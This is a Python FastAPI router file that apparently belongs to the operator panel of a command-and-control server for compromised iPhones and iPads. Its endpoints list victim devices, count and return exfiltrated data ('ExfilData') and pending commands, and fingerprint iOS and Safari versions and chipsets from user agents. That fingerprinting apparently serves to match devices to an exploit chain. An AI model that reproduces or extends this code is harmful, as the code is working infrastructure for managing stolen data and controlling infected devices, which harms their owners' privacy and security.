from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from sqlalchemy import desc, func
from ..database import get_db, Device, Log, ExfilData, Command
from ..auth import get_current_user
from ..schemas import DeviceResponse, LogResponse, ExfilDataResponse
from typing import List

router = APIRouter(prefix="/api/devices", tags=["devices"], redirect_slashes=False)


@router.get("", response_model=List[DeviceResponse])
async def get_devices(
    skip: int = 0,
    limit: int = 100,
    status: str = None,
    device_uuid: str = None,
    ip: str = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(Device).order_by(desc(Device.last_seen))
    if status:
        query = query.filter(Device.status == status)
    if device_uuid:
        query = query.filter(Device.device_uuid.contains(device_uuid))
    if ip:
        query = query.filter(Device.ip.contains(ip))
    devices = query.offset(skip).limit(limit).all()
    return devices


@router.get("/stats")
async def get_device_stats(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    total_devices = db.query(func.count(Device.id)).scalar()
    active_devices = db.query(func.count(Device.id)).filter(Device.status == "active").scalar()
    offline_devices = db.query(func.count(Device.id)).filter(Device.status == "offline").scalar()
    
    total_exfil = db.query(func.count(ExfilData.id)).scalar()
    total_commands = db.query(func.count(Command.id)).scalar()
    pending_commands = db.query(func.count(Command.id)).filter(Command.status == "pending").scalar()
    
    by_os_version = db.query(
        Device.os_version,
        func.count(Device.id)
    ).group_by(Device.os_version).all()
    
    by_model = db.query(
        Device.device_model,
        func.count(Device.id)
    ).group_by(Device.device_model).all()
    
    return {
        "total_devices": total_devices or 0,
        "active_devices": active_devices or 0,
        "offline_devices": offline_devices or 0,
        "total_exfil": total_exfil or 0,
        "total_commands": total_commands or 0,
        "pending_commands": pending_commands or 0,
        "by_os_version": dict(by_os_version),
        "by_model": dict(by_model)
    }


@router.post("/refresh-all")
async def refresh_all_devices(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    devices = db.query(Device).all()
    updated = 0
    
    for device in devices:
        if device.user_agent:
            import re
            version_match = re.search(r'Version/([0-9.]+)', device.user_agent)
            if version_match:
                device.os_version = version_match.group(1)
            
            safari_match = re.search(r'Safari/([0-9.]+)', device.user_agent)
            if safari_match:
                device.safari_version = safari_match.group(1)
            
            if not device.device_model:
                if 'iPhone' in device.user_agent:
                    device.device_model = 'iPhone'
                elif 'iPad' in device.user_agent:
                    device.device_model = 'iPad'
                elif 'iPod' in device.user_agent:
                    device.device_model = 'iPod Touch'
            
            if device.os_version and device.device_model and not device.chipset:
                version_map = {
                    '18.7': 'A17 Pro / A18',
                    '18.6': 'A17 Pro / A18',
                    '18.5': 'A17 Pro / A18',
                    '18.4': 'A17 Pro / A18',
                }
                device.chipset = version_map.get(device.os_version)
            
            updated += 1
    
    db.commit()
    return {"message": f"Refreshed {updated} devices"}


@router.get("/{device_uuid}", response_model=DeviceResponse)
async def get_device(device_uuid: str, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    return device


@router.get("/{device_uuid}/logs", response_model=List[LogResponse])
async def get_device_logs(
    device_uuid: str,
    skip: int = 0,
    limit: int = 100,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    logs = db.query(Log).filter(Log.ip == device.ip).order_by(desc(Log.timestamp)).offset(skip).limit(limit).all()
    return logs


@router.get("/{device_uuid}/exfil", response_model=List[ExfilDataResponse])
async def get_device_exfil(
    device_uuid: str,
    skip: int = 0,
    limit: int = 100,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    exfil = db.query(ExfilData).filter(ExfilData.device_uuid == device_uuid).order_by(desc(ExfilData.uploaded_at)).offset(skip).limit(limit).all()
    return exfil


@router.post("/{device_uuid}/refresh")
async def refresh_device_info(device_uuid: str, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    if device.user_agent:
        import re
        version_match = re.search(r'Version/([0-9.]+)', device.user_agent)
        if version_match:
            device.os_version = version_match.group(1)
        
        safari_match = re.search(r'Safari/([0-9.]+)', device.user_agent)
        if safari_match:
            device.safari_version = safari_match.group(1)
        
        if 'iPhone' in device.user_agent:
            device.device_model = 'iPhone'
        elif 'iPad' in device.user_agent:
            device.device_model = 'iPad'
        elif 'iPod' in device.user_agent:
            device.device_model = 'iPod Touch'
        
        if device.os_version and device.device_model:
            version_map = {
                '18.7': 'A17 Pro / A18',
                '18.6': 'A17 Pro / A18',
                '18.5': 'A17 Pro / A18',
                '18.4': 'A17 Pro / A18',
            }
            device.chipset = version_map.get(device.os_version)
    
    db.commit()
    return {"message": "Device info refreshed", "device": device}


@router.delete("/{device_uuid}")
async def delete_device(device_uuid: str, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    db.query(ExfilData).filter(ExfilData.device_uuid == device_uuid).delete()
    db.delete(device)
    db.commit()
    return {"message": "Device deleted"}